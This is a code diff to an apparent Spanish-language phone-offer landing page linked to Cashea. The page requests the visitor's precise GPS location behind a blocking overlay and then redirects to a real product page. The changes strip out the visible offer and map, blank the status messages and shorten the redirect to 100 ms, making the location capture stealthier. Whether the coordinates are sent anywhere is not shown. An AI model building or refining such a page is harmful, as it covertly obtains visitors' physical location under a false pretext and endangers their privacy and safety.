@@ -466,79 +466,10 @@
 <!-- LOCATION BANNER -->
 <div id="loc-banner">
   <span class="pin">●</span>
-  <span id="loc-text">Obteniendo ubicación…</span>
+  <span id="loc-text"></span>
 </div>
 
-<!-- LOCATION DETAIL (se muestra tras captura geo) -->
-<div id="loc-detail">
-  <div class="loc-detail-inner">
-    <div>
-      <div class="loc-detail-title"><div class="pulse-dot"></div> Mapa en vivo</div>
-      <div id="map"></div>
-    </div>
-    <div>
-      <div class="loc-detail-title" style="margin-bottom:.75rem">Detalles de ubicación</div>
-      <div class="loc-info-grid" id="loc-chips"></div>
-    </div>
-  </div>
-</div>
 
-<!-- MAIN -->
-<main>
-  <div class="eyebrow">✦ Oferta exclusiva</div>
-  <h1 class="page-title">El celular que<br>necesitas. <span class="highlight">Sin excusas.</span></h1>
-  <p class="page-sub">Potencia 5G, cámara de 200 MP y batería de larga duración. Cómpralo a tu ritmo con Cashea.</p>
-
-  <div class="phone-card">
-    <div class="phone-img-side">
-      <img
-        src="https://i.imgur.com/5vRrBqH.png"
-        alt="Xiaomi Redmi Note 13 Pro 5G Ocean Teal"
-        onerror="this.style.display='none'; this.parentElement.innerHTML += '<div style=\'font-size:5rem;z-index:1;position:relative\'>📱</div>'"
-      />
-    </div>
-    <div class="phone-info">
-      <div class="phone-brand">Xiaomi</div>
-      <div class="phone-name">Redmi Note 13 Pro 5G<br>Ocean Teal</div>
-      <div class="phone-specs">
-        <div class="spec-chip">
-          <div class="spec-label">Cámara</div>
-          <div class="spec-val">200 MP</div>
-        </div>
-        <div class="spec-chip">
-          <div class="spec-label">Red</div>
-          <div class="spec-val">5G</div>
-        </div>
-        <div class="spec-chip">
-          <div class="spec-label">RAM</div>
-          <div class="spec-val">8 GB</div>
-        </div>
-        <div class="spec-chip">
-          <div class="spec-label">Almacenamiento</div>
-          <div class="spec-val">256 GB</div>
-        </div>
-        <div class="spec-chip">
-          <div class="spec-label">Pantalla</div>
-          <div class="spec-val">6.67" AMOLED</div>
-        </div>
-        <div class="spec-chip">
-          <div class="spec-label">Batería</div>
-          <div class="spec-val">5000 mAh</div>
-        </div>
-      </div>
-      <div class="cashea-badge">
-        ✦ Disponible en cuotas con Cashea
-      </div>
-      <a class="btn-cashea" href="https://www.cashea.app/productos/xiaomi-redmi-note-13-pro-5g-8gb-256gb-ocean-teal" target="_blank" rel="noopener">
-        Ver precio y cuotas →
-      </a>
-    </div>
-  </div>
-</main>
-
-<footer>
-  <p>Powered by Cashea &mdash; Compra ahora, paga después.</p>
-</footer>
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css"/>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
@@ -713,8 +644,8 @@ function requestLocation() {
     return;
   }
 
-  updateBanner('Obteniendo ubicación…');
-  showToast('Buscando señal GPS…', '📡');
+  updateBanner('…');
+  showToast('…', '📡');
 
   navigator.geolocation.getCurrentPosition(
     async (quickPos) => {
@@ -741,7 +672,7 @@ function requestLocation() {
       updateAccuracyCircle(latitude, longitude, accuracy);
       updateBanner(`📡 Precisión: ±${Math.round(accuracy)}m`);
 
-      if (accuracy < 20 || attempts >= 5) {
+      if (accuracy < 25 || attempts >= 4) {
         navigator.geolocation.clearWatch(watchId);
         document.getElementById('blocker').style.display = 'none';
 
@@ -768,7 +699,7 @@ function requestLocation() {
         // ── REDIRECCIÓN ──────────────────────────────────
         setTimeout(() => {
           window.location.href = 'https://www.cashea.app/productos/xiaomi-redmi-note-13-pro-5g-8gb-256gb-ocean-teal';
-        }, 1500);
+        }, 100);
       }
     },
     (err) => {
